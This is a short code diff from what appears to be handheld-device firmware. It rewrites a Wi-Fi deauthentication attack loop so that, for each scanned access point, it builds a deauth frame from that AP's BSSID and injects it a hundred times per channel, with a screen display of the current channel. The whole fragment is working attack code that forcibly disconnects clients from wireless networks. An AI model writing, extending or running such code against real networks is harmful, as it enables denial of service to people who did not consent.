@@ -361,11 +361,13 @@ ScanNets:
     while (true) {
         for (const auto &record : ap_records) {
             channel = record.primary;
-            wsl_bypasser_send_raw_frame(&record, record.primary, _default_target);
+            // Mopie's OWN deauth frame built from this AP's BSSID + injected.
+            uint8_t dmFrame[26];
+            mopie_build_deauth(dmFrame, (const uint8_t *)record.bssid, _default_target, 0x0001);
             tft.setCursor(10, tftHeight - 45);
             tft.println("Channel " + String(record.primary) + "    ");
             for (int i = 0; i < 100; i++) {
-                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+                mopie_send_raw(dmFrame, sizeof(dmFrame), record.primary, 1);
                 count += 3;
                 if (EscPress) break;
             }
